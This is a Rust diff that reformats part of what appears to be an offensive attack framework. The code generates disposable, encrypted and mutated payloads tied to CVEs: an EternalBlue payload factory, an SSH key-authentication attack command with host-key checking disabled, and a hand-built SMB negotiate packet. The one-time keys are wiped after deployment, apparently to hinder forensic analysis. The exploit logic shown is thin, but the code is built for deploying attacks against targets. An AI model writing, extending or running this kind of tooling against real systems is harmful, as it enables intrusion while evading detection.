@@ -15,8 +15,8 @@ pub struct EphemeralPayload {
     pub id: Uuid,
     pub target: String,
     pub cve: String,
-    pub payload: Vec<u8>,        // encrypted + mutated
-    pub one_time_key: [u8; 32],  // ChaCha20 key, never stored
+    pub payload: Vec<u8>,       // encrypted + mutated
+    pub one_time_key: [u8; 32], // ChaCha20 key, never stored
     pub used: bool,
 }
 
@@ -39,15 +39,22 @@ impl EphemeralPayload {
     /// After deployment, the payload marks itself as used and the key is wiped.
     pub fn deploy(&mut self) -> Option<Vec<u8>> {
         if self.used {
-            warn!("EPHEMERAL: payload {} already used, refusing redeploy", self.id);
+            warn!(
+                "EPHEMERAL: payload {} already used, refusing redeploy",
+                self.id
+            );
             return None;
         }
 
         // Unseal for deployment
         let plaintext = wax::unseal_payload(&self.payload, &self.one_time_key)?;
 
-        info!("EPHEMERAL: deploying {} to {} ({} bytes)",
-            self.cve, self.target, plaintext.len());
+        info!(
+            "EPHEMERAL: deploying {} to {} ({} bytes)",
+            self.cve,
+            self.target,
+            plaintext.len()
+        );
 
         self.used = true;
         // Wipe the key
@@ -86,7 +93,10 @@ impl Default for EphemeralFactory {
 
 impl EphemeralFactory {
     pub fn new() -> Self {
-        Self { created_count: 0, deployed_count: 0 }
+        Self {
+            created_count: 0,
+            deployed_count: 0,
+        }
     }
 
     /// Generate a disposable EternalBlue payload.
@@ -104,8 +114,17 @@ impl EphemeralFactory {
     }
 
     /// Generate a disposable SSH brute-force payload.
-    pub fn make_ssh_brute(&mut self, target: &str, username: &str, key_data: &str) -> EphemeralPayload {
-        let raw = format!("ssh -o StrictHostKeyChecking=no -i /dev/stdin {}@{} <<< '{}'", username, target, key_data).into_bytes();
+    pub fn make_ssh_brute(
+        &mut self,
+        target: &str,
+        username: &str,
+        key_data: &str,
+    ) -> EphemeralPayload {
+        let raw = format!(
+            "ssh -o StrictHostKeyChecking=no -i /dev/stdin {}@{} <<< '{}'",
+            username, target, key_data
+        )
+        .into_bytes();
         self.created_count += 1;
         EphemeralPayload::new(target, "SSH_KEY_AUTH", &raw)
     }
@@ -116,12 +135,12 @@ fn build_smb_payload(target: &str) -> Vec<u8> {
     // SMB Negotiate Protocol Request (minimal)
     let mut payload = Vec::new();
     payload.extend_from_slice(b"\x00\x00\x00\x85"); // NetBIOS session
-    payload.extend_from_slice(b"\xff\x53\x4d\x42");  // SMB magic
-    payload.extend_from_slice(b"\x72");               // Negotiate
-    payload.extend_from_slice(&[0u8; 4]);             // Status
-    payload.extend_from_slice(b"\x00\x00");           // Flags
-    payload.extend_from_slice(&[0u8; 12]);            // Flags2 + PID
-    payload.extend_from_slice(target.as_bytes());     // Target in payload
+    payload.extend_from_slice(b"\xff\x53\x4d\x42"); // SMB magic
+    payload.extend_from_slice(b"\x72"); // Negotiate
+    payload.extend_from_slice(&[0u8; 4]); // Status
+    payload.extend_from_slice(b"\x00\x00"); // Flags
+    payload.extend_from_slice(&[0u8; 12]); // Flags2 + PID
+    payload.extend_from_slice(target.as_bytes()); // Target in payload
     payload
 }
 
